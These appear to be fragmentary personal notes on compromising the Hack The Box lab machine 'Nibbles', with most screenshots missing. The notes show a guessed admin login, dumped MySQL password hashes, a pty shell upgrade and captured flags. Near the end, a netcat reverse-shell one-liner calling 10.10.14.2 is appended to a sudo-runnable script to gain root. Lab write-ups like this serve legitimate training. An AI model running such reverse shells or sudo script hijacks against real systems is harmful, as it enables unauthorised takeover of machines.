# Nibbles

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

[http://10.129.221.96/nibbleblog/index.php?controller=blog&action=view&category=uncategorised](http://10.129.221.96/nibbleblog/index.php?controller=blog&action=view&category=uncategorised)

*[image unavailable]*
Apache/2.4.18 (Ubuntu)
*[image unavailable]*
JuicyBOOK
*[image unavailable]*
shadow
keys
*[image unavailable]*
pivot to 10.10.10.134?
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

test with
admin
nibbles

it works!
*[image unavailable]*

79378f814ff584702cc6ded1950bcd7dd4d4562d
*[image unavailable]*
# Disable directory browsing
Options -Indexes
# Disable Magic Quotes
\<IfModule mod_php5.c\>
php_flag magic_quotes_gpc off
\</IfModule\>
# Secure .xml files
\<FilesMatch ".(xml)\$"\>
Order Allow,Deny
Deny from all
\</FilesMatch\>
# Secure shadow.php
\<Files shadow.php\>
order allow,deny
deny from all
\</Files\>
# Secure keys.php
\<Files keys.php\>
order allow,deny
deny from all
\</Files\>
ErrorDocument 404 /nibbleblog/index.php?controller=page&action=404
\<IfModule mod_rewrite.c\>
RewriteEngine on
RewriteBase /nibbleblog/
RewriteRule \^category/(\[\^/\]+)/page-(\[0-9\]+)\$ index.php?controller=blog&action=view&category=\$1&number=\$2 \[L\]
RewriteRule \^category/(\[\^/\]+)/\$ index.php?controller=blog&action=view&category=\$1&number=0 \[L\]
RewriteRule \^tag/(\[\^/\]+)/page-(\[0-9\]+)\$ index.php?controller=blog&action=view&tag=\$1&number=\$2 \[L\]
RewriteRule \^tag/(\[\^/\]+)/\$ index.php?controller=blog&action=view&tag=\$1&number=0 \[L\]
RewriteRule \^page-(\[0-9\]+)\$ index.php?controller=blog&action=view&number=\$1 \[L\]
RewriteRule \^post/(\[\^/\]+)/\$ index.php?controller=post&action=view&post=\$1 \[L\]
RewriteRule \^post-(\[0-9\]+)/(.\*)\$ index.php?controller=post&action=view&id_post=\$1 \[L\]
RewriteRule \^page/(\[\^/\]+)/\$ index.php?controller=page&action=view&page=\$1 \[L\]
RewriteRule \^feed/\$ feed.php \[L\]
RewriteRule \^(\[\^/\]+)/\$ index.php?controller=page&action=\$1 \[L\]
\</IfModule\>
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

*[image unavailable]*

*[image unavailable]*
*[image unavailable]*

upgrade shell

python3 -c 'import pty;pty.spawn("/bin/bash")’

*[image unavailable]*

user own
629a9c01b7211d8287a97e314e1314b4

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
W
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
```bash
User	Host	authentication_string
root	localhost	*9CFBBC772F3F6C106020035386DA5BBBF1249A11
mysql.session	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint	localhost	*0B46F5EC336AFB411DB534D6A50EA98C619B0DE4
```
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

*[image unavailable]*
*[image unavailable]*
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.10.14.2 8888 \> /tmp/f" \>\> [monitor.sh](http://monitor.sh/)
*[image unavailable]*
sudo /home/nibbler/personal/stuff/monitor.sh
*[image unavailable]*
root own
59f84eb7e2bbdae3b8db000c274c5b47
dde904d29b29ab51b8dbc2602cbcaa58
